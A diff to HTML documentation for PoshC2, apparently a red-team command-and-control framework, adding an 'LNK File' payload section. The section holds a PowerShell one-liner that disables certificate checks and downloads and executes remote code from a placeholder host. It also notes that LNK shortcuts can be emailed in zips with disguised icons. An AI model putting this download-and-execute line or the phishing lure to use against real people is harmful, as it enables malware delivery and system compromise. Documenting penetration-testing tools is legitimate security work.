@@ -90,6 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
 <li class="toctree-l2"><a class="reference internal" href="serviceexe.html">Service Executable</a></li>
@@ -178,6 +179,12 @@
             
   <div class="section" id="lnk-file">
 <h1>LNK File<a class="headerlink" href="#lnk-file" title="Permalink to this headline">¶</a></h1>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1086">Powershell</a></p>
+<p>An LNK file is an arbitrary shortcut, PoshC2 uses this to create a simple powershell one liner to download and execute the payload:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">powershell</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">exec</span> <span class="n">bypass</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX (new-object system.net.webclient).downloadstring(&#39;https://www.example.com/webapp/static/dksllk&#39;)&quot;</span>
+</pre></div>
+</div>
+<p>LNK files can be zipped up and sent to a user via malicious email. You can also change the icon of an embedded Lnk file within a zip which will make the shortcut look like any application.</p>
 </div>
 
 
